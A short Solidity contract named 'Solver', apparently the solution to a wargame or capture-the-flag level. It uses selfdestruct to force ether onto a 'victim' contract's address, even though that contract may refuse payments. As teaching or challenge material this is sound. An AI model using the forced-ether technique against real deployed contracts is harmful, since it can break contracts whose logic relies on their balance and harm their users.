pragma solidity ^0.8.0;

contract Solver {

    address payable victim;

    constructor(address _addr) public payable {
        require(msg.value == 1);    
        victim = payable( _addr );
    }

    function solve() public  {
        selfdestruct(victim);
    }

    receive() external payable {}
}
